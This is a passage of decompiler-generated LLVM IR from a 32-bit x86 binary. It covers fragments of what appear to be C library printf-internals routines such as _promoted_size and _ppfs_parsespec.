  %v8_804e821 = icmp eq i32 %v3_804e821, -2147483648
  %v1_804e828 = icmp eq i1 %v8_804e821, false
  br i1 %v1_804e828, label %dec_label_pc_804e83b, label %dec_label_pc_804e82a

dec_label_pc_804e82a:                             ; preds = %dec_label_pc_804e821
  %v1_804e82a = add i32 %v1_804e830, 76
  %v2_804e82a = inttoptr i32 %v1_804e82a to i32*
  %v3_804e82a = load i32, i32* %v2_804e82a, align 4
  store i32 %v3_804e82a, i32* %eax.global-to-local, align 4
  %v1_804e82d = add i32 %v3_804e82a, 4
  store i32 %v1_804e82d, i32* %edx.global-to-local, align 4
  store i32 %v1_804e82d, i32* %v2_804e82a, align 4
  %v0_804e833 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e833 = inttoptr i32 %v0_804e833 to i32*
  %v2_804e833 = load i32, i32* %v1_804e833, align 4
  store i32 %v2_804e833, i32* %eax.global-to-local, align 4
  %v1_804e835 = load i32, i32* @ecx, align 4
  %v2_804e835 = add i32 %v1_804e835, 80
  %v3_804e835 = inttoptr i32 %v2_804e835 to i32*
  store i32 %v2_804e833, i32* %v3_804e835, align 4
  %v0_804e838 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e838 = load i32, i32* @ecx, align 4
  %v2_804e838 = add i32 %v1_804e838, 4
  %v3_804e838 = inttoptr i32 %v2_804e838 to i32*
  store i32 %v0_804e838, i32* %v3_804e838, align 4
  %v1_804e8b017.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e83b

dec_label_pc_804e83b:                             ; preds = %dec_label_pc_804e821, %dec_label_pc_804e82a
  %v1_804e8b017 = phi i32 [ %v1_804e830, %dec_label_pc_804e821 ], [ %v1_804e8b017.pre, %dec_label_pc_804e82a ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e8b018 = add i32 %v1_804e8b017, 28
  %v3_804e8b019 = inttoptr i32 %v2_804e8b018 to i32*
  %v4_804e8b020 = load i32, i32* %v3_804e8b019, align 4
  %v5_804e8b321 = icmp sgt i32 %v4_804e8b020, 0
  br i1 %v5_804e8b321, label %dec_label_pc_804e83f, label %dec_label_pc_804e8e5.loopexit

dec_label_pc_804e83f:                             ; preds = %dec_label_pc_804e83b, %dec_label_pc_804e8af
  %v1_804e8b023 = phi i32 [ %v1_804e8b0, %dec_label_pc_804e8af ], [ %v1_804e8b017, %dec_label_pc_804e83b ]
  %v1_804e83f22 = phi i32 [ %v1_804e8af, %dec_label_pc_804e8af ], [ 0, %dec_label_pc_804e83b ]
  %v2_804e83f = mul i32 %v1_804e83f22, 4
  %v3_804e83f = add i32 %v2_804e83f, 40
  %v4_804e83f = add i32 %v3_804e83f, %v1_804e8b023
  %v5_804e83f = inttoptr i32 %v4_804e83f to i32*
  %v6_804e83f = load i32, i32* %v5_804e83f, align 4
  store i32 %v6_804e83f, i32* %eax.global-to-local, align 4
  %v1_804e843 = add i32 %v6_804e83f, -8
  %v9_804e843 = icmp eq i32 %v1_804e843, 0
  br i1 %v9_804e843, label %dec_label_pc_804e8af, label %dec_label_pc_804e848

dec_label_pc_804e848:                             ; preds = %dec_label_pc_804e83f
  %v10_804e843 = icmp slt i32 %v1_804e843, 0
  %v6_804e843 = sub i32 7, %v6_804e83f
  %v7_804e843 = and i32 %v6_804e843, %v6_804e83f
  %v8_804e843 = icmp slt i32 %v7_804e843, 0
  %v1_804e848 = add i32 %v1_804e8b023, 76
  %v2_804e848 = inttoptr i32 %v1_804e848 to i32*
  %v3_804e848 = load i32, i32* %v2_804e848, align 4
  store i32 %v3_804e848, i32* %edx.global-to-local, align 4
  %v3_804e84b = icmp eq i1 %v10_804e843, %v8_804e843
  br i1 %v3_804e84b, label %dec_label_pc_804e85b, label %dec_label_pc_804e84d

dec_label_pc_804e84d:                             ; preds = %dec_label_pc_804e848
  %tmp15 = icmp slt i32 %v6_804e83f, 3
  %v9_804e854 = icmp eq i32 %v6_804e83f, 7
  %v1_804e857 = icmp eq i1 %v9_804e854, false
  %or.cond = or i1 %tmp15, %v1_804e857
  br i1 %or.cond, label %dec_label_pc_804e8a2, label %dec_label_pc_804e884

dec_label_pc_804e85b:                             ; preds = %dec_label_pc_804e848
  %tmp16 = icmp sgt i32 %v6_804e83f, 1024
  br i1 %tmp16, label %dec_label_pc_804e864, label %dec_label_pc_804e8a2

dec_label_pc_804e864:                             ; preds = %dec_label_pc_804e85b
  %v6_804e864 = icmp eq i32 %v6_804e83f, 2048
  br i1 %v6_804e864, label %dec_label_pc_804e874, label %dec_label_pc_804e86b

dec_label_pc_804e86b:                             ; preds = %dec_label_pc_804e864
  %v9_804e86b = icmp eq i32 %v6_804e83f, 2055
  %v1_804e870 = icmp eq i1 %v9_804e86b, false
  br i1 %v1_804e870, label %dec_label_pc_804e8a2, label %dec_label_pc_804e893

dec_label_pc_804e874:                             ; preds = %dec_label_pc_804e864
  %v1_804e874 = add i32 %v3_804e848, 8
  store i32 %v1_804e874, i32* %eax.global-to-local, align 4
  store i32 %v1_804e874, i32* %v2_804e848, align 4
  %v0_804e87a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e87a = inttoptr i32 %v0_804e87a to i32*
  %v2_804e87a = load i32, i32* %v1_804e87a, align 4
  store i32 %v2_804e87a, i32* %eax.global-to-local, align 4
  %v1_804e87c = add i32 %v0_804e87a, 4
  %v2_804e87c = inttoptr i32 %v1_804e87c to i32*
  %v3_804e87c = load i32, i32* %v2_804e87c, align 4
  store i32 %v3_804e87c, i32* %edx.global-to-local, align 4
  %v1_804e87f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e87f = add i32 %v1_804e87f, 4
  %v3_804e87f = inttoptr i32 %v2_804e87f to i32*
  store i32 %v3_804e87c, i32* %v3_804e87f, align 4
  %v0_804e8aa.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8aa

dec_label_pc_804e884:                             ; preds = %dec_label_pc_804e84d
  %v3_804e884 = load i32, i32* %v2_804e848, align 4
  store i32 %v3_804e884, i32* %edx.global-to-local, align 4
  %v1_804e887 = add i32 %v3_804e884, 8
  store i32 %v1_804e887, i32* %eax.global-to-local, align 4
  store i32 %v1_804e887, i32* %v2_804e848, align 4
  %v0_804e88d = load i32, i32* %edx.global-to-local, align 4
  %v1_804e88d = inttoptr i32 %v0_804e88d to double*
  %v2_804e88d = load double, double* %v1_804e88d, align 4
  %v2_804e88f = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e88f = inttoptr i32 %v2_804e88f to double*
  store double %v2_804e88d, double* %v4_804e88f, align 4
  br label %dec_label_pc_804e8ac

dec_label_pc_804e893:                             ; preds = %dec_label_pc_804e86b
  %v3_804e893 = load i32, i32* %v2_804e848, align 4
  store i32 %v3_804e893, i32* %edx.global-to-local, align 4
  %v1_804e896 = add i32 %v3_804e893, 12
  store i32 %v1_804e896, i32* %eax.global-to-local, align 4
  store i32 %v1_804e896, i32* %v2_804e848, align 4
  %v0_804e89c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e89c = inttoptr i32 %v0_804e89c to x86_fp80*
  %v2_804e89c = load x86_fp80, x86_fp80* %v1_804e89c, align 4
  %v2_804e89e = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e89e = inttoptr i32 %v2_804e89e to x86_fp80*
  store x86_fp80 %v2_804e89c, x86_fp80* %v3_804e89e, align 4
  br label %dec_label_pc_804e8ac

dec_label_pc_804e8a2:                             ; preds = %dec_label_pc_804e84d, %dec_label_pc_804e85b, %dec_label_pc_804e86b
  %v1_804e8a2 = add i32 %v3_804e848, 4
  store i32 %v1_804e8a2, i32* %eax.global-to-local, align 4
  store i32 %v1_804e8a2, i32* %v2_804e848, align 4
  %v0_804e8a8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e8a8 = inttoptr i32 %v0_804e8a8 to i32*
  %v2_804e8a8 = load i32, i32* %v1_804e8a8, align 4
  store i32 %v2_804e8a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8aa

dec_label_pc_804e8aa:                             ; preds = %dec_label_pc_804e874, %dec_label_pc_804e8a2
  %v0_804e8aa = phi i32 [ %v0_804e8aa.pre, %dec_label_pc_804e874 ], [ %v2_804e8a8, %dec_label_pc_804e8a2 ]
  %v1_804e8aa = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e8aa = inttoptr i32 %v1_804e8aa to i32*
  store i32 %v0_804e8aa, i32* %v2_804e8aa, align 4
  %v0_804e8ac.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e8ac

dec_label_pc_804e8ac:                             ; preds = %dec_label_pc_804e893, %dec_label_pc_804e884, %dec_label_pc_804e8aa
  %v0_804e8ac = phi i32 [ %v2_804e89e, %dec_label_pc_804e893 ], [ %v2_804e88f, %dec_label_pc_804e884 ], [ %v0_804e8ac.pre, %dec_label_pc_804e8aa ]
  %v1_804e8ac = add i32 %v0_804e8ac, 12
  store i32 %v1_804e8ac, i32* %ebx.global-to-local, align 4
  %v0_804e8af.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e8b0.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e8af

dec_label_pc_804e8af:                             ; preds = %dec_label_pc_804e83f, %dec_label_pc_804e8ac
  %v1_804e8b0 = phi i32 [ %v1_804e8b023, %dec_label_pc_804e83f ], [ %v1_804e8b0.pre, %dec_label_pc_804e8ac ]
  %v0_804e8af = phi i32 [ %v1_804e83f22, %dec_label_pc_804e83f ], [ %v0_804e8af.pre, %dec_label_pc_804e8ac ]
  %v1_804e8af = add i32 %v0_804e8af, 1
  store i32 %v1_804e8af, i32* %esi.global-to-local, align 4
  %v2_804e8b0 = add i32 %v1_804e8b0, 28
  %v3_804e8b0 = inttoptr i32 %v2_804e8b0 to i32*
  %v4_804e8b0 = load i32, i32* %v3_804e8b0, align 4
  %v5_804e8b3 = icmp slt i32 %v1_804e8af, %v4_804e8b0
  br i1 %v5_804e8b3, label %dec_label_pc_804e83f, label %dec_label_pc_804e8e5.loopexit

dec_label_pc_804e8b7:                             ; preds = %entry
  br i1 %v1_804e8be, label %dec_label_pc_804e8ce, label %dec_label_pc_804e8c0

dec_label_pc_804e8c0:                             ; preds = %dec_label_pc_804e8b7
  %v1_804e8c0 = add i32 %arg1, 36
  %v2_804e8c0 = inttoptr i32 %v1_804e8c0 to i8*
  %v3_804e8c0 = load i8, i8* %v2_804e8c0, align 1
  %v2_804e8c4 = zext i8 %v3_804e8c0 to i32
  %v3_804e8c4 = mul nuw nsw i32 %v2_804e8c4, 12
  store i32 %v3_804e8c4, i32* %eax.global-to-local, align 4
  %v2_804e8c7 = add i32 %arg1, 68
  %v3_804e8c7 = add i32 %v2_804e8c7, %v3_804e8c4
  %v4_804e8c7 = inttoptr i32 %v3_804e8c7 to i32*
  %v5_804e8c7 = load i32, i32* %v4_804e8c7, align 4
  store i32 %v5_804e8c7, i32* %eax.global-to-local, align 4
  store i32 %v5_804e8c7, i32* %v2_804e8b7, align 4
  %v0_804e8ce.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e8ce

dec_label_pc_804e8ce:                             ; preds = %dec_label_pc_804e8b7, %dec_label_pc_804e8c0
  %v1_804e8e2 = phi i32 [ %arg1, %dec_label_pc_804e8b7 ], [ %v0_804e8ce.pre, %dec_label_pc_804e8c0 ]
  %v1_804e8ce = add i32 %v1_804e8e2, 4
  %v2_804e8ce = inttoptr i32 %v1_804e8ce to i32*
  %v3_804e8ce = load i32, i32* %v2_804e8ce, align 4
  %v8_804e8ce = icmp eq i32 %v3_804e8ce, -2147483648
  %v1_804e8d5 = icmp eq i1 %v8_804e8ce, false
  br i1 %v1_804e8d5, label %dec_label_pc_804e8e5, label %dec_label_pc_804e8d7

dec_label_pc_804e8d7:                             ; preds = %dec_label_pc_804e8ce
  %v1_804e8d7 = add i32 %v1_804e8e2, 37
  %v2_804e8d7 = inttoptr i32 %v1_804e8d7 to i8*
  %v3_804e8d7 = load i8, i8* %v2_804e8d7, align 1
  %v2_804e8db = zext i8 %v3_804e8d7 to i32
  %v3_804e8db = mul nuw nsw i32 %v2_804e8db, 12
  store i32 %v3_804e8db, i32* %eax.global-to-local, align 4
  %v1_804e8de = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e8de = add nsw i32 %v3_804e8db, -12
  %v3_804e8de = add i32 %v2_804e8de, %v1_804e8de
  %v4_804e8de = inttoptr i32 %v3_804e8de to i32*
  %v5_804e8de = load i32, i32* %v4_804e8de, align 4
  store i32 %v5_804e8de, i32* %eax.global-to-local, align 4
  store i32 %v5_804e8de, i32* %v2_804e8ce, align 4
  %v0_804e8e5.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e8e5

dec_label_pc_804e8e5.loopexit:                    ; preds = %dec_label_pc_804e8af, %dec_label_pc_804e83b
  %v1_804e8b0.lcssa = phi i32 [ %v1_804e8b017, %dec_label_pc_804e83b ], [ %v1_804e8b0, %dec_label_pc_804e8af ]
  br label %dec_label_pc_804e8e5

dec_label_pc_804e8e5:                             ; preds = %dec_label_pc_804e8e5.loopexit, %dec_label_pc_804e8ce, %dec_label_pc_804e8d7
  %v10_804e8ec = phi i32 [ %v1_804e8b0.lcssa, %dec_label_pc_804e8e5.loopexit ], [ %v1_804e8e2, %dec_label_pc_804e8ce ], [ %v0_804e8e5.pre, %dec_label_pc_804e8d7 ]
  %v1_804e8e5 = add i32 %v10_804e8ec, 8
  %v2_804e8e5 = inttoptr i32 %v1_804e8e5 to i32*
  %v3_804e8e5 = load i32, i32* %v2_804e8e5, align 4
  store i32 %v3_804e8e5, i32* %eax.global-to-local, align 4
  %v2_804e8e8 = icmp slt i32 %v3_804e8e5, 0
  %v1_804e8ea = icmp eq i1 %v2_804e8e8, false
  br i1 %v1_804e8ea, label %dec_label_pc_804e900, label %dec_label_pc_804e8ec

dec_label_pc_804e8ec:                             ; preds = %dec_label_pc_804e8e5
  %v1_804e8ec = add i32 %v10_804e8ec, 16
  %v2_804e8ec = inttoptr i32 %v1_804e8ec to i32*
  %v3_804e8ec = load i32, i32* %v2_804e8ec, align 4
  %v4_804e8ec = or i32 %v3_804e8ec, 8
  store i32 %v4_804e8ec, i32* %v2_804e8ec, align 4
  %v0_804e8f0 = load i32, i32* @ecx, align 4
  %v1_804e8f0 = add i32 %v0_804e8f0, 16
  %v2_804e8f0 = inttoptr i32 %v1_804e8f0 to i32*
  %v3_804e8f0 = load i32, i32* %v2_804e8f0, align 4
  %v4_804e8f0 = and i32 %v3_804e8f0, -2
  store i32 %v4_804e8f0, i32* %v2_804e8f0, align 4
  %v0_804e8f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8f4 = sub i32 0, %v0_804e8f4
  store i32 %v1_804e8f4, i32* %eax.global-to-local, align 4
  %v1_804e8f6 = load i32, i32* @ecx, align 4
  %v2_804e8f6 = add i32 %v1_804e8f6, 8
  %v3_804e8f6 = inttoptr i32 %v2_804e8f6 to i32*
  store i32 %v1_804e8f4, i32* %v3_804e8f6, align 4
  %v0_804e8f9 = load i32, i32* @ecx, align 4
  %v1_804e8f9 = add i32 %v0_804e8f9, 20
  %v2_804e8f9 = inttoptr i32 %v1_804e8f9 to i32*
  store i32 32, i32* %v2_804e8f9, align 4
  %v0_804e902.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e900

dec_label_pc_804e900:                             ; preds = %dec_label_pc_804e8e5, %dec_label_pc_804e8ec
  %v0_804e902 = phi i32 [ %v3_804e8e5, %dec_label_pc_804e8e5 ], [ %v0_804e902.pre, %dec_label_pc_804e8ec ]
  %v2_804e900 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e900, i32* @ebx, align 4
  ret i32 %v0_804e902

; uselistorder directives
  uselistorder i32 %v3_804e8db, { 1, 0 }
  uselistorder i32 %v3_804e8c4, { 1, 0 }
  uselistorder i32 %v1_804e8af, { 2, 1, 0 }
  uselistorder i32 %v1_804e8b0, { 0, 2, 1 }
  uselistorder i32 %v3_804e848, { 1, 0, 2 }
  uselistorder i32* %v2_804e848, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e843, { 1, 0 }
  uselistorder i32 %v6_804e83f, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e83f22, { 1, 0 }
  uselistorder i1 %v1_804e8be, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804e900, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e8ce, { 1, 0 }
  uselistorder label %dec_label_pc_804e8af, { 1, 0 }
  uselistorder label %dec_label_pc_804e8ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e8aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e8a2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e83f, { 1, 0 }
  uselistorder label %dec_label_pc_804e83b, { 1, 0 }
  uselistorder label %dec_label_pc_804e821, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e904 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e90b

dec_label_pc_804e90b:                             ; preds = %dec_label_pc_804e90b, %entry
  %v0_804e90b = phi i32 [ ptrtoint (i8** @global_var_805626a.195 to i32), %entry ], [ %v1_804e90b, %dec_label_pc_804e90b ]
  %v1_804e90b = add i32 %v0_804e90b, -2
  %v1_804e90e = inttoptr i32 %v1_804e90b to i16*
  %v2_804e90e = load i16, i16* %v1_804e90e, align 2
  %v3_804e90e = sext i16 %v2_804e90e to i32
  %v12_804e911 = icmp ne i32 %v3_804e90e, %v0_804e904
  %v6_804e91b = icmp ugt i32 %v1_804e90b, ptrtoint (i32* @global_var_8056252.196 to i32)
  %or.cond = and i1 %v6_804e91b, %v12_804e911
  br i1 %or.cond, label %dec_label_pc_804e90b, label %dec_label_pc_804e91d

dec_label_pc_804e91d:                             ; preds = %dec_label_pc_804e90b
  %.pre = add i32 %v0_804e90b, -134570580
  %v2_804e923 = sdiv i32 %.pre, 2
  store i32 %v2_804e923, i32* @edx, align 4
  %v1_804e925 = add i32 %v2_804e923, ptrtoint (i8** @global_var_805626a.195 to i32)
  %v2_804e925 = inttoptr i32 %v1_804e925 to i8*
  %v3_804e925 = load i8, i8* %v2_804e925, align 1
  %v4_804e925 = zext i8 %v3_804e925 to i32
  ret i32 %v4_804e925

; uselistorder directives
  uselistorder i32 %v2_804e923, { 1, 0 }
  uselistorder i32 %v1_804e90b, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805626a.195 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e92e = load i32, i32* @edi, align 4
  %v0_804e92f = load i32, i32* @esi, align 4
  %v0_804e930 = load i32, i32* @ebx, align 4
  store i32 %v0_804e930, i32* %stack_var_-16, align 4
  %v4_804e930 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804e95c = add i32 %tmp76, 24
  %v2_804e95c = inttoptr i32 %v1_804e95c to i32*
  %v3_804e95c = load i32, i32* %v2_804e95c, align 4
  store i32 %v3_804e95c, i32* %eax.global-to-local, align 4
  %v1_804e963 = add i32 %tmp76, 16
  %v2_804e963 = inttoptr i32 %v1_804e963 to i32*
  %v3_804e963 = load i32, i32* %v2_804e963, align 4
  %v1_804e966 = and i32 %v3_804e963, 128
  %v2_804e966 = icmp eq i32 %v1_804e966, 0
  store i32 %v1_804e966, i32* %edi.global-to-local, align 4
  %v1_804e96c = icmp eq i1 %v2_804e966, false
  br i1 %v1_804e96c, label %dec_label_pc_804e97f, label %dec_label_pc_804e96e

dec_label_pc_804e96e:                             ; preds = %entry
  %v2_804e96e = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804e9cc.outer

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804eb07
  %v1_804e979 = add i32 %v0_804eb07.pre.pre, 1
  store i32 %v1_804e979, i32* @esi, align 4
  br label %dec_label_pc_804eb17

dec_label_pc_804e97f:                             ; preds = %entry
  %v15_804e931 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e981

dec_label_pc_804e981:                             ; preds = %dec_label_pc_804e9a9.dec_label_pc_804e981_crit_edge, %dec_label_pc_804e97f
  %v2_804e992 = phi i32 [ %v2_804e992.pre, %dec_label_pc_804e9a9.dec_label_pc_804e981_crit_edge ], [ %v15_804e931, %dec_label_pc_804e97f ]
  %v3_804e992 = phi i32 [ %v1_804e9a9, %dec_label_pc_804e9a9.dec_label_pc_804e981_crit_edge ], [ 0, %dec_label_pc_804e97f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804e985 = mul i32 %v3_804e992, 4
  store i32 %v1_804e985, i32* @ecx, align 4
  %v2_804e98c = load i32, i32* %arg1, align 4
  store i32 %v2_804e98c, i32* @edx, align 4
  %v2_804e98e = add i32 %v1_804e985, -4
  %v3_804e98e = add i32 %v2_804e98e, %v2_804e98c
  %v4_804e98e = inttoptr i32 %v3_804e98e to i32*
  %v5_804e98e = load i32, i32* %v4_804e98e, align 4
  store i32 %v5_804e98e, i32* %eax.global-to-local, align 4
  %v1_804e992 = trunc i32 %v5_804e98e to i8
  %v4_804e992 = add i32 %v2_804e992, 36
  %v5_804e992 = add i32 %v4_804e992, %v3_804e992
  %v6_804e992 = inttoptr i32 %v5_804e992 to i8*
  store i8 %v1_804e992, i8* %v6_804e992, align 1
  %v0_804e996 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e996 = urem i32 %v0_804e996, 256
  %v2_804e996 = load i32, i32* @ebx, align 4
  %v3_804e996 = and i32 %v2_804e996, -256
  %v4_804e996 = or i32 %v3_804e996, %v1_804e996
  store i32 %v4_804e996, i32* @ebx, align 4
  %v1_804e998 = mul i32 %v0_804e996, 16777216
  %v2_804e998 = sdiv i32 %v1_804e998, 16777216
  store i32 %v2_804e998, i32* %eax.global-to-local, align 4
  %v1_804e99b = load i32, i32* @edx, align 4
  %v2_804e99b = load i32, i32* @ecx, align 4
  %v3_804e99b = add i32 %v1_804e99b, -4
  %v4_804e99b = add i32 %v3_804e99b, %v2_804e99b
  %v5_804e99b = inttoptr i32 %v4_804e99b to i32*
  %v6_804e99b = load i32, i32* %v5_804e99b, align 4
  %v17_804e99b = icmp eq i32 %v2_804e998, %v6_804e99b
  %v1_804e99f = icmp eq i1 %v17_804e99b, false
  br i1 %v1_804e99f, label %dec_label_pc_804ece8, label %dec_label_pc_804e9a5

dec_label_pc_804e9a5:                             ; preds = %dec_label_pc_804e981
  %v3_804e9a5 = trunc i32 %v0_804e996 to i8
  %v4_804e9a5 = icmp eq i8 %v3_804e9a5, 0
  br i1 %v4_804e9a5, label %dec_label_pc_804e9af, label %dec_label_pc_804e9a9

dec_label_pc_804e9a9:                             ; preds = %dec_label_pc_804e9a5
  %v0_804e9a9 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e9a9 = add i32 %v0_804e9a9, 1
  store i32 %v1_804e9a9, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804e9a9, 32
  br i1 %tmp175, label %dec_label_pc_804e9a9.dec_label_pc_804e981_crit_edge, label %dec_label_pc_804e9af

dec_label_pc_804e9a9.dec_label_pc_804e981_crit_edge: ; preds = %dec_label_pc_804e9a9
  %v2_804e992.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e981

dec_label_pc_804e9af:                             ; preds = %dec_label_pc_804e9a9, %dec_label_pc_804e9a5
  %v2_804e9b4 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804e9cc.outer

dec_label_pc_804e9cc.outer:                       ; preds = %dec_label_pc_804e9af, %dec_label_pc_804e96e, %dec_label_pc_804eae9
  %v0_804e9d8.ph94 = phi i32 [ %v1_804eae9, %dec_label_pc_804eae9 ], [ %v2_804e96e, %dec_label_pc_804e96e ], [ %v2_804e9b4, %dec_label_pc_804e9af ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804eae9 ], [ %tmp66, %dec_label_pc_804e96e ], [ %tmp66, %dec_label_pc_804e9af ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804e972, %dec_label_pc_804eae9 ], [ 0, %dec_label_pc_804e96e ], [ 0, %dec_label_pc_804e9af ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804eae9 ], [ %v3_804e95c, %dec_label_pc_804e96e ], [ %v3_804e95c, %dec_label_pc_804e9af ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804eae9 ], [ 0, %dec_label_pc_804e96e ], [ 0, %dec_label_pc_804e9af ]
  %v7_804e9d3 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804e9d3 = trunc i64 %v7_804e9d3 to i32
  %v2_804e9db = add i32 %v8_804e9d3, 80
  br label %dec_label_pc_804e9cc

dec_label_pc_804e9cc:                             ; preds = %dec_label_pc_804e9cc.outer, %dec_label_pc_804ea89
  %v0_804e9d8 = phi i32 [ %v0_804ea96, %dec_label_pc_804ea89 ], [ %v0_804e9d8.ph94, %dec_label_pc_804e9cc.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804ea89 ], [ %stack_var_-32.1.ph, %dec_label_pc_804e9cc.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804ea89 ], [ %stack_var_-88.1.ph, %dec_label_pc_804e9cc.outer ]
  store i32 %v0_804e9d8, i32* @edx, align 4
  store i32 %v0_804e9d8, i32* @esi, align 4
  %v1_804e9ce = inttoptr i32 %v0_804e9d8 to i8*
  %v2_804e9ce = load i8, i8* %v1_804e9ce, align 1
  %v11_804e9ce = icmp eq i8 %v2_804e9ce, 42
  %v1_804e9d1 = icmp eq i1 %v11_804e9ce, false
  br i1 %v1_804e9d1, label %dec_label_pc_804e9e3, label %dec_label_pc_804e9d3

dec_label_pc_804e9d3:                             ; preds = %dec_label_pc_804e9cc
  store i32 %v8_804e9d3, i32* %eax.global-to-local, align 4
  %v1_804e9d8 = add i32 %v0_804e9d8, 1
  store i32 %v1_804e9d8, i32* @esi, align 4
  %v0_804e9db = load i32, i32* @esp, align 4
  %v3_804e9db = add i32 %v2_804e9db, %v0_804e9db
  %v4_804e9db = inttoptr i32 %v3_804e9db to i32*
  store i32 0, i32* %v4_804e9db, align 4
  %v0_804e9fd.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e9e3

dec_label_pc_804e9e3:                             ; preds = %dec_label_pc_804e9cc, %dec_label_pc_804e9d3
  %v0_804e9fd.pre = phi i32 [ %v0_804e9d8, %dec_label_pc_804e9cc ], [ %v0_804e9fd.pre.pre, %dec_label_pc_804e9d3 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804e9e5 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_804e9e5, i32* %ebp.global-to-local, align 4
  %v4_804e9fd.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e9fd124 = inttoptr i32 %v0_804e9fd.pre to i8*
  %v2_804e9fd125 = load i8, i8* %v1_804e9fd124, align 1
  %v3_804e9fd126 = zext i8 %v2_804e9fd125 to i32
  %v5_804e9fd127 = and i32 %v4_804e9fd.pre, -256
  %v6_804e9fd128 = or i32 %v3_804e9fd126, %v5_804e9fd127
  store i32 %v6_804e9fd128, i32* %eax.global-to-local, align 4
  %v2_804e9ff129 = sext i8 %v2_804e9fd125 to i32
  store i32 %v2_804e9ff129, i32* @ecx, align 4
  %v2_804ea02130 = mul nsw i32 %v2_804e9ff129, 2
  %v3_804ea02131 = add i32 %v2_804ea02130, %v0_804e9e5
  %v4_804ea02132 = inttoptr i32 %v3_804ea02131 to i8*
  %v5_804ea02133 = load i8, i8* %v4_804ea02132, align 1
  %v6_804ea02134 = and i8 %v5_804ea02133, 8
  %v7_804ea02135 = icmp eq i8 %v6_804ea02134, 0
  %v1_804ea07136 = icmp eq i1 %v7_804ea02135, false
  br i1 %v1_804ea07136, label %dec_label_pc_804e9ed, label %dec_label_pc_804ea09

dec_label_pc_804e9ed:                             ; preds = %dec_label_pc_804e9e3, %dec_label_pc_804e9fc
  %v2_804e9ff140 = phi i32 [ %v2_804e9ff, %dec_label_pc_804e9fc ], [ %v2_804e9ff129, %dec_label_pc_804e9e3 ]
  %v6_804e9fd139 = phi i32 [ %v6_804e9fd, %dec_label_pc_804e9fc ], [ %v6_804e9fd128, %dec_label_pc_804e9e3 ]
